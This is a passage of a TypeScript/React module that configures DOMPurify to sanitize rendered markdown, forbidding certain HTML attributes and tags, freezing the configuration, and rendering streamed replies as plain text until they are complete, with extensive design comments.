 *
 * `stripMedia` STAYS in the viewer, now unreachable from this pipeline. Same
 * status as `decoration-guard.ts`'s `style` line: belt-and-braces for HTML that
 * reaches a decoration pass from anywhere but here, not a second profile.
 *
 * THE PURE LAYOUT ATTRIBUTES ARE STILL LEFT, and are weaker than any of the
 * above: `border`, `cellpadding`, `cellspacing`, `valign`, `nowrap`, `noshade`,
 * `clear`, `width` and `height` all survive. They size and space a box; none of
 * them hides content, repaints it, speaks to a screen reader, or takes focus,
 * which is where this file draws the line.
 *
 * Everything else is DOMPurify's default and deliberately so: its allow-list,
 * its `javascript:`-scheme refusal and its `on*`-attribute stripping are the
 * parts that get security review upstream, and re-deriving them here would mean
 * owning them here. What we choose is the PROFILE; what is safe inside it is
 * theirs.
 */
export const SANITIZE_CONFIG: SanitizeConfig = {
  USE_PROFILES: { html: true },
  // Everything after `style` rides here rather than in a flag because no flag
  // covers any of it: `role` and the legacy presentational set and `tabindex`
  // are all ordinary members of the html profile's allow-list, and
  // `ALLOW_ARIA_ATTR` governs only the `aria-*` pattern. `FORBID_ATTR` is
  // checked FIRST in DOMPurify 3.4.12 (`_isValidAttribute`), ahead of both the
  // allow-list and the aria branch, so this wins wherever the two could
  // disagree — verified against the shipped source, not assumed.
  //
  // `align` is the deliberate omission: `marked` writes it for GFM table
  // alignment, so it is the one member of the legacy set that markdown itself
  // emits. See the comment above, and the test that pins it.
  FORBID_ATTR: [
    'style',
    'role',
    'color',
    'bgcolor',
    'background',
    'face',
    'size',
    'hidden',
    'popover',
    'popovertarget',
    'popovertargetaction',
    'inert',
    'tabindex',
  ],
  // The tag half (#612, extended by #625). Same shape as `FORBID_ATTR` and for
  // the same reason: every one of these is an ordinary member of the html
  // profile's TAG allow-list, so no flag reaches them and each has to be named.
  // `KEEP_CONTENT` is left at its default `true`, which is the half that makes
  // this safe to do at all — the element goes, its children stay.
  //
  // `input` is the one markdown emits, and it is only safe to name here
  // because `MARKED_OPTIONS`' renderer draws the task-list checkbox as a glyph
  // before this runs. Delete that renderer and this line starts eating
  // checklists — see the comment above, and the test that pins it.
  //
  // NOT HERE, and deliberately: `img` (markdown's own, for every `![alt](src)`),
  // and `iframe` / `embed` / `object` / `param`, which are not in the profile at
  // all — see the seventh block above, and the test that pins the difference.
  FORBID_TAGS: [
    // #612 — controls, legacy presentation, and the UA-hidden tags
    'button',
    'input',
    'select',
    'option',
    'optgroup',
    'datalist',
    'textarea',
    'center',
    'marquee',
    'font',
    'rp',
    // #625 — media and its children, the image map, the empty box, and the
    // second UA-hidden tag `rp` claimed to be the last of
    'audio',
    'video',
    'source',
    'track',
    'picture',
    'map',
    'area',
    'canvas',
    'dialog',
  ],
  ALLOW_DATA_ATTR: false,
  ALLOW_ARIA_ATTR: false,
};

// FROZEN, because "one configuration" is this module's entire thesis and an
// exported mutable object is a second one waiting to be written at runtime:
// `SANITIZE_CONFIG.FORBID_ATTR.pop()` from anywhere in the renderer would
// re-open the hole for every surface at once, silently, with the source still
// reading exactly as it does here. BOTH nested arrays and the profile object
// are frozen too — freezing only the top level leaves them mutable, which is
// where the policy actually lives.
//
// Frozen as statements rather than by wrapping the literal in `Object.freeze`
// so the declared type stays `SanitizeConfig`: DOMPurify's `FORBID_ATTR` and
// `FORBID_TAGS` are `string[]`, and a frozen literal infers `readonly string[]`,
// which would need a cast to assign. Runtime immutability, no cast.
Object.freeze(SANITIZE_CONFIG);
Object.freeze(SANITIZE_CONFIG.FORBID_ATTR);
Object.freeze(SANITIZE_CONFIG.FORBID_TAGS);
Object.freeze(SANITIZE_CONFIG.USE_PROFILES);

/**
 * Markdown in, sanitized HTML out. The only place either library is called.
 *
 * Exported as a function as well as a component because the viewer needs the
 * HTML in its own container with its own scroll handling, and "render markdown
 * without mounting `<Markdown>`" must not be a reason to write a second
 * pipeline.
 */
export function renderMarkdown(text: string): string {
  return DOMPurify.sanitize(marked.parse(text, MARKED_OPTIONS), SANITIZE_CONFIG);
}

/**
 * Render markdown to sanitized HTML.
 *
 * While text is STILL ARRIVING (P2-E18-10) it renders as plain text with a
 * caret on the end, and only becomes markdown once it is complete.
 *
 * Two reasons, and both matter:
 *
 *  - Half a document is not a document. A code fence, list or table that is
 *    mid-write parses as something else entirely, so a streamed reply would
 *    reflow and re-style itself on almost every token.
 *  - Cost. `useMemo` is keyed on the text, so parsing per token means parsing
 *    the WHOLE reply once per token — quadratic in the length of the answer, on
 *    the renderer thread, times every session streaming at once.
 *
 * `className` defaults to the feed's own styling (`.feed-md` in tokens.css),
 * which is where every markdown rule in this app already lives. A second
 * surface that wants different type passes its own and adds rules of its own —
 * it does not fork the pipeline.
 *
 * `decorate` is the surface's own pass over the sanitized HTML, run inside the
 * same `useMemo` (#465). The document viewer has had one since P2-E16-02
 * (`decorateDocument`) but does not render through this component; the feed's
 * (`decorateFeedMarkdown`) needs somewhere to hang, and this is the ONE place
 * a `<Markdown>` surface's HTML exists before it reaches the page.
 *
 * A surface that forgets to pass one is not thereby forgeable — `SANITIZE_CONFIG`
 * closes `data-*` for every surface whether it decorates or not, which is the
 * layer that does not depend on remembering. The pass is what a surface needs
 * once it decorates: it takes its OWN namespace back first (see
 * `decoration-guard.ts`), and only then writes its markup.
 */
export function Markdown({
  text,
  streaming,
  className = 'feed-md',
  decorate,
}: {
  text: string;
  streaming?: boolean;
  className?: string;
  /** must be a stable module-level function — it is a `useMemo` dependency */
  decorate?: (html: string) => string;
}): React.JSX.Element {
  const html = React.useMemo(() => {
    if (streaming) return '';
    const sanitized = renderMarkdown(text);
    return decorate ? decorate(sanitized) : sanitized;
  }, [text, streaming, decorate]);
  if (streaming) {
    return (
      <div className={className} style={{ whiteSpace: 'pre-wrap', overflowWrap: 'break-word' }}>
        {text}
        {/* -ink, and no opacity (#246, ported here when the move landed after
            that fix): the caret is the only thing on screen saying the answer
            is still arriving, so it is information, not decoration. The raw
            hue at 0.8 opacity measured 2.08:1 on daylight, and the opacity is
            a second contrast cut nothing measures — it goes, not gets tuned. */}
        <span style={{ color: 'var(--status-working-ink)' }}>{STREAMING_CARET}</span>
      </div>
    );
  }
  return <div className={className} dangerouslySetInnerHTML={{ __html: html }} />;
}
